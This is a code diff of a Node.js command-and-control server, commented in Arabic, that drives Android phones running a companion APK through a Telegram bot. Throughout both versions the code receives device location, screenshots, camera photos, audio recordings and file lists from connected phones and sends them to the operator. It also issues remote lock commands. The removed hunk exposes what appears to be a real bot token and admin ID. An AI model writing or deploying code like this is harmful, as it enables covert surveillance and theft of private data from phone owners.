@@ -1,272 +1,385 @@
+hereconst express = require('express');
+const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
-const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const http = require('http');
+
+// ⚡ الإعدادات - غير هذه القيم حسب احتياجك
+const config = {
+    TELEGRAM_TOKEN: "ضع_توكن_البوت_هنا", // @BotFather
+    AUTHORIZED_USERS: [123456789], // أيدي التلجرام الخاص بك
+    SERVER_PORT: 3000,
+    SERVER_HOST: "localhost" // محلي فقط للأمان
+};
+
+// التأكد من وجود التوكن
+if (config.TELEGRAM_TOKEN === "ضع_توكن_البوت_هنا") {
+    console.log("❌ يرجى إضافة توكن البوت في config");
+    process.exit(1);
+}
+
+// إنشاء التطبيقات
 const app = express();
-const port = process.env.PORT || 3000;
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
+const bot = new TelegramBot(config.TELEGRAM_TOKEN, { polling: true });
 
-// 🔐 الإعدادات - نفس يلي بالكود المشفر
-const TELEGRAM_TOKEN = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
-const ADMIN_ID = '7604667042';
+// ⚡ تخزين البيانات
+const connectedDevices = new Map(); // الأجهزة المتصلة
+const userSessions = new Map();     // جلسات المستخدمين
 
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
-
-// 📱 تخزين بيانات الأجهزة
-let devices = new Map();
-
-// 🛠️ إعداد Express بنفس طريقة الكود المشفر
+// ⚡ وسائط Express
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
 
-// 🌐 Endpoints بنفس يلي بالكود المشفر
-app.post('/apk/connect', (req, res) => {
-    console.log('📱 اتصال من APK:', req.body);
-    
-    const { device_id, device_info, android_version, battery } = req.body;
-    
-    // حفظ بيانات الجهاز
-    devices.set(device_id, {
-        id: device_id,
-        info: device_info,
-        android: android_version,
-        battery: battery,
-        connected: true,
-        lastSeen: new Date(),
-        ip: req.ip
-    });
-    
-    console.log(`✅ جهاز متصل: ${device_id}`);
-    
-    // إشعار للتلجرام
-    bot.sendMessage(ADMIN_ID, 
-        `📱 **جهاز جديد متصل**\n` +
-        `📟 ${device_info}\n` +
-        `🔋 ${battery}%\n` +
-        `🤖 ${android_version}`
-    );
-    
-    res.json({ 
-        status: 'success',
-        message: 'Connected successfully',
-        server_time: Date.now()
+// 🌐 مسارات الويب (للمراقبة فقط)
+app.get('/', (req, res) => {
+    res.send(`
+        <html>
+            <head><title>Remote Control Server</title></head>
+            <body>
+                <h1>🛜 سيرفر التحكم عن بعد</h1>
+                <p>الأجهزة المتصلة: <span id="count">${connectedDevices.size}</span></p>
+                <div id="devices"></div>
+                
+                <script>
+                    function updateDevices() {
+                        fetch('/api/devices')
+                            .then(r => r.json())
+                            .then(data => {
+                                document.getElementById('count').textContent = data.count;
+                                document.getElementById('devices').innerHTML = 
+                                    data.devices.map(d => '<p>📱 ' + d + '</p>').join('');
+                            });
+                    }
+                    setInterval(updateDevices, 5000);
+                    updateDevices();
+                </script>
+            </body>
+        </html>
+    `);
+});
+
+app.get('/api/devices', (req, res) => {
+    res.json({
+        count: connectedDevices.size,
+        devices: Array.from(connectedDevices.keys())
     });
 });
 
-app.post('/apk/location', (req, res) => {
-    console.log('📍 موقع من APK:', req.body);
+// 🔌 اتصال WebSocket من APK
+wss.on('connection', (ws, req) => {
+    const deviceId = generateDeviceId();
+    const clientIp = req.socket.remoteAddress;
     
-    const { device_id, latitude, longitude, accuracy } = req.body;
+    console.log(`📱 APK متصل: ${deviceId} من ${clientIp}`);
     
-    // تحديث موقع الجهاز
-    const device = devices.get(device_id);
-    if (device) {
-        device.location = { latitude, longitude, accuracy };
-        device.lastSeen = new Date();
-    }
-    
-    // إرسال الموقع للتلجرام
-    bot.sendMessage(ADMIN_ID,
-        `📍 **موقع الجهاز**\n` +
-        `🌍 ${latitude}, ${longitude}\n` +
-        `🎯 ${accuracy}m\n` +
-        `📱 ${device_id}`
-    );
-    
-    res.json({ status: 'success' });
+    // حفظ الجهاز المتصل
+    connectedDevices.set(deviceId, {
+        ws: ws,
+        ip: clientIp,
+        connectedAt: new Date(),
+        info: {}
+    });
+
+    // ⚡ إرسال رسالة ترحيب للAPK
+    ws.send(JSON.stringify({
+        type: 'welcome',
+        deviceId: deviceId,
+        message: 'تم الاتصال بنجاح بالسيرفر',
+        timestamp: Date.now()
+    }));
+
+    // 📩 استقبال البيانات من APK
+    ws.on('message', (data) => {
+        try {
+            const message = JSON.parse(data);
+            handleDeviceMessage(deviceId, message);
+        } catch (error) {
+            console.error('❌ خطأ في معالجة رسالة APK:', error);
+        }
+    });
+
+    // 📡 إرسال بيانات الاتصال للتلجرام
+    broadcastToTelegram(`📱 جهاز جديد متصل:\n- المعرف: ${deviceId}\n- IP: ${clientIp}\n- الوقت: ${new Date().toLocaleString()}`);
+
+    // 🔌 عند انقطاع الاتصال
+    ws.on('close', () => {
+        console.log(`❌ APK انقطع: ${deviceId}`);
+        connectedDevices.delete(deviceId);
+        broadcastToTelegram(`❌ جهاز انقطع: ${deviceId}`);
+    });
+
+    ws.on('error', (error) => {
+        console.error(`❌ خطأ في اتصال ${deviceId}:`, error);
+    });
 });
 
-app.post('/apk/upload', (req, res) => {
-    console.log('📁 رفع ملف من APK:', req.body);
-    
-    const { device_id, file_type, file_data, timestamp } = req.body;
-    
-    // معالجة الملف حسب النوع
-    let message = '';
-    switch(file_type) {
-        case 'screenshot':
-            message = '📸 لقطة شاشة جديدة';
+// ⚡ معالجة رسائل APK
+function handleDeviceMessage(deviceId, message) {
+    const device = connectedDevices.get(deviceId);
+    if (!device) return;
+
+    console.log(`📩 من ${deviceId}:`, message.type);
+
+    switch (message.type) {
+        case 'device_info':
+            device.info = message.data;
+            broadcastToTelegram(
+                `📊 معلومات الجهاز ${deviceId}:\n` +
+                `📱 الموديل: ${message.data.model || 'غير معروف'}\n` +
+                `🤖 أندرويد: ${message.data.androidVersion || 'غير معروف'}\n` +
+                `🔋 البطارية: ${message.data.battery || 'غير معروف'}%`
+            );
             break;
-        case 'camera_front':
-            message = '🤳 صورة كاميرا أمامية';
+
+        case 'location':
+            broadcastToTelegram(
+                `📍 موقع الجهاز ${deviceId}:\n` +
+                `📌 خط الطول: ${message.data.longitude}\n` +
+                `📌 خط العرض: ${message.data.latitude}\n` +
+                `🕒 الوقت: ${new Date(message.timestamp).toLocaleString()}`
+            );
             break;
-        case 'camera_back':
-            message = '📷 صورة كاميرا خلفية';
+
+        case 'screenshot_result':
+            if (message.success) {
+                broadcastToTelegram(`✅ تم التقاط لقطة شاشة من ${deviceId}`);
+            } else {
+                broadcastToTelegram(`❌ فشل في لقطة الشاشة من ${deviceId}`);
+            }
             break;
-        case 'audio':
-            message = '🎙️ تسجيل صوتي';
+
+        case 'camera_result':
+            if (message.success) {
+                broadcastToTelegram(`✅ تم التقاط صورة من الكاميرا ${deviceId}`);
+            }
             break;
+
+        case 'file_list':
+            broadcastToTelegram(
+                `📁 ملفات الجهاز ${deviceId}:\n` +
+                message.data.files.slice(0, 10).map(f => `📄 ${f}`).join('\n') +
+                (message.data.files.length > 10 ? `\n... و ${message.data.files.length - 10} ملفات أخرى` : '')
+            );
+            break;
+
         default:
-            message = `📁 ملف: ${file_type}`;
+            console.log('📨 رسالة غير معروفة:', message);
     }
-    
-    bot.sendMessage(ADMIN_ID, `${message}\n📱 من: ${device_id}`);
-    
-    res.json({ status: 'success', received: true });
-});
-
-app.post('/apk/command', (req, res) => {
-    console.log('🎯 أمر من APK:', req.body);
-    
-    const { device_id, command, data } = req.body;
-    
-    // معالجة الأوامر الواردة من APK
-    res.json({ status: 'success', executed: true });
-});
-
-// 🎯 إرسال أوامر للـ APK
-app.post('/send_command', (req, res) => {
-    const { device_id, command, parameters } = req.body;
-    
-    console.log(`📤 إرسال أمر لـ ${device_id}: ${command}`, parameters);
-    
-    // هنا رح نرسل الأمر للـ APK
-    res.json({ 
-        status: 'success', 
-        message: 'Command sent to device',
-        command_id: Date.now()
-    });
-});
+}
 
 // 🤖 أوامر التلجرام
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
-    if (chatId.toString() !== ADMIN_ID) {
-        return bot.sendMessage(chatId, '❌ Unauthorized');
+    if (!config.AUTHORIZED_USERS.includes(chatId)) {
+        return bot.sendMessage(chatId, '❌ غير مصرح لك بالوصول لهذا البوت');
     }
-    
-    const deviceCount = devices.size;
-    
+
+    userSessions.set(chatId, { activeDevice: null });
+
     bot.sendMessage(chatId, 
-        `🤖 **Phone Control System**\n\n` +
-        `📱 Connected devices: ${deviceCount}\n` +
-        `🔗 Server: Active\n\n` +
-        `Available commands:\n` +
-        `/status - System status\n` +
-        `/devices - Connected devices\n` +
-        `/location - Get location\n` +
-        `/screenshot - Take screenshot\n` +
-        `/camera - Capture camera\n` +
-        `/audio - Record audio\n` +
-        `/vibrate - Vibrate device`
+        `🎮 **أدوات التحكم بالأجهزة**
+
+📊 /status - حالة السيرفر والأجهزة
+📋 /devices - قائمة الأجهزة المتصلة
+🖼️ /screen - لقطة شاشة من الجهاز
+📍 /location - موقع الجهاز
+📁 /files - استعراض ملفات الجهاز
+📷 /camera - صورة من الكاميرا
+🎤 /record - تسجيل صوت
+🔒 /lock - قفل الجهاز
+
+استخدم: /command deviceId
+مثال: /screen device123
+        `,
+        { parse_mode: 'Markdown' }
     );
 });
 
+// 📊 حالة السيرفر
 bot.onText(/\/status/, (msg) => {
     const chatId = msg.chat.id;
-    if (chatId.toString() !== ADMIN_ID) return;
-    
-    const deviceCount = devices.size;
-    const activeDevices = Array.from(devices.values()).filter(d => d.connected).length;
-    
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
     bot.sendMessage(chatId,
-        `📊 **System Status**\n\n` +
-        `📱 Devices: ${deviceCount} (${activeDevices} active)\n` +
-        `🟢 Status: Running\n` +
-        `⏰ Uptime: ${process.uptime().toFixed(0)}s\n` +
-        `💾 Memory: ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB`
+        `📊 **حالة السيرفر**
+        
+🖥️ السيرفر: ✅ نشط
+📱 الأجهزة: ${connectedDevices.size} متصل
+⏰ التشغيل: ${formatUptime(process.uptime())}
+💾 الذاكرة: ${Math.round(process.memoryUsage().rss / 1024 / 1024)}MB
+        `,
+        { parse_mode: 'Markdown' }
     );
 });
 
+// 📋 قائمة الأجهزة
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
-    if (chatId.toString() !== ADMIN_ID) return;
-    
-    if (devices.size === 0) {
-        return bot.sendMessage(chatId, '❌ No devices connected');
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    if (connectedDevices.size === 0) {
+        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
     }
-    
-    let devicesList = '📱 **Connected Devices:**\n\n';
-    
-    devices.forEach((device, deviceId) => {
-        const status = device.connected ? '🟢' : '🔴';
-        devicesList += `${status} ${deviceId}\n`;
-        devicesList += `📟 ${device.info}\n`;
-        devicesList += `🔋 ${device.battery}% | 🤖 ${device.android}\n`;
-        devicesList += `🕒 ${device.lastSeen.toLocaleTimeString()}\n\n`;
+
+    let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
+    connectedDevices.forEach((device, deviceId) => {
+        devicesList += `🔹 ${deviceId}\n`;
+        devicesList += `   📍 IP: ${device.ip}\n`;
+        devicesList += `   ⏰ متصل منذ: ${formatTimeDiff(device.connectedAt)}\n\n`;
     });
-    
-    bot.sendMessage(chatId, devicesList);
+
+    bot.sendMessage(chatId, devicesList, { parse_mode: 'Markdown' });
 });
 
-bot.onText(/\/location/, (msg) => {
+// 🖼️ لقطة شاشة
+bot.onText(/\/screen (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    if (chatId.toString() !== ADMIN_ID) return;
-    
-    bot.sendMessage(chatId, '📍 Requesting location from devices...');
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'take_screenshot',
+        quality: 80,
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `📸 جاري أخذ لقطة شاشة من ${deviceId}...`);
 });
 
-bot.onText(/\/screenshot/, (msg) => {
+// 📍 الموقع
+bot.onText(/\/location (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    if (chatId.toString() !== ADMIN_ID) return;
-    
-    bot.sendMessage(chatId, '📸 Taking screenshot...');
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'get_location',
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `📍 جاري الحصول على موقع ${deviceId}...`);
 });
 
-// 🌐 صفحة ويب بسيطة
-app.get('/', (req, res) => {
-    const deviceCount = devices.size;
-    
-    res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Phone Control System</title>
-            <style>
-                body {
-                    font-family: Arial, sans-serif;
-                    text-align: center;
-                    padding: 50px;
-                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                    color: white;
-                }
-                .container {
-                    background: rgba(255,255,255,0.1);
-                    padding: 30px;
-                    border-radius: 15px;
-                    backdrop-filter: blur(10px);
-                    max-width: 600px;
-                    margin: 0 auto;
-                }
-                .status {
-                    background: ${deviceCount > 0 ? '#28a745' : '#dc3545'};
-                    padding: 15px;
-                    border-radius: 10px;
-                    margin: 20px 0;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>🤖 Phone Control System</h1>
-                <div class="status">
-                    ${deviceCount > 0 ? 
-                        `✅ System Active - ${deviceCount} devices connected` : 
-                        '❌ No devices connected'
-                    }
-                </div>
-                <p><strong>User:</strong> George96399</p>
-                <p><strong>Telegram ID:</strong> ${ADMIN_ID}</p>
-                <p><strong>Endpoints:</strong></p>
-                <ul style="text-align: left;">
-                    <li>POST /apk/connect</li>
-                    <li>POST /apk/location</li>
-                    <li>POST /apk/upload</li>
-                    <li>POST /apk/command</li>
-                    <li>POST /send_command</li>
-                </ul>
-            </div>
-        </body>
-        </html>
-    `);
+// 📁 الملفات
+bot.onText(/\/files (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'list_files',
+        path: '/sdcard/',
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `📁 جاري استعراض ملفات ${deviceId}...`);
 });
 
-// 🚀 بدء التشغيل
-app.listen(port, () => {
-    console.log('🚀 Server running on port:', port);
-    console.log('📱 Ready for APK connections');
-    
-    bot.sendMessage(ADMIN_ID, 
-        '🚀 **System Started**\n\n' +
-        '📡 Server is now listening for APK connections\n' +
-        '🌐 Endpoints are ready'
-    );
+// 📷 الكاميرا
+bot.onText(/\/camera (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'take_camera_photo',
+        camera: 'back',
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `📷 جاري التقاط صورة من ${deviceId}...`);
+});
+
+// 🎤 التسجيل
+bot.onText(/\/record (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'record_audio',
+        duration: 10000, // 10 ثواني
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `🎤 جاري التسجيل من ${deviceId}...`);
+});
+
+// 🔒 قفل الجهاز
+bot.onText(/\/lock (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (!config.AUTHORIZED_USERS.includes(chatId)) return;
+
+    const deviceId = match[1].trim();
+    sendToDevice(deviceId, {
+        type: 'lock_device',
+        replyTo: chatId
+    });
+
+    bot.sendMessage(chatId, `🔒 جاري قفل الجهاز ${deviceId}...`);
+});
+
+// ⚡ إرسال أمر لجهاز معين
+function sendToDevice(deviceId, command) {
+    const device = connectedDevices.get(deviceId);
+    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
+        // إعلام المستخدم بأن الجهاز غير متصل
+        const chatId = command.replyTo;
+        if (chatId) {
+            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
+        }
+        return false;
+    }
+
+    device.ws.send(JSON.stringify(command));
+    return true;
+}
+
+// 📨 إرسال رسالة لجميع المستخدمين المصرح لهم
+function broadcastToTelegram(message) {
+    config.AUTHORIZED_USERS.forEach(userId => {
+        bot.sendMessage(userId, message).catch(err => {
+            console.error('❌ فشل إرسال للتلجرام:', err);
+        });
+    });
+}
+
+// 🛠️ وظائف مساعدة
+function generateDeviceId() {
+    return 'device_' + Math.random().toString(36).substring(2, 8);
+}
+
+function formatUptime(seconds) {
+    const hours = Math.floor(seconds / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    return `${hours} ساعة, ${minutes} دقيقة`;
+}
+
+function formatTimeDiff(date) {
+    const diff = Date.now() - date.getTime();
+    const minutes = Math.floor(diff / 60000);
+    if (minutes < 60) return `${minutes} دقيقة`;
+    const hours = Math.floor(minutes / 60);
+    return `${hours} ساعة`;
+}
+
+// 🚀 بدء السيرفر
+server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
+    console.log(`🎯 سيرفر التحكم يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
+    console.log(`🤖 بوت التلجرام جاهز للاستخدام`);
+    console.log(`📱 متوافق مع APK عبر WebSocket`);
+    console.log(`🔒 الأمان: محلي فقط - لا اتصالات خارجية`);
+});
+
+// 🛡️ معالجة الأخطاء
+process.on('uncaughtException', (error) => {
+    console.error('❌ خطأ غير متوقع:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('❌ وعد مرفوض:', reason);
 });
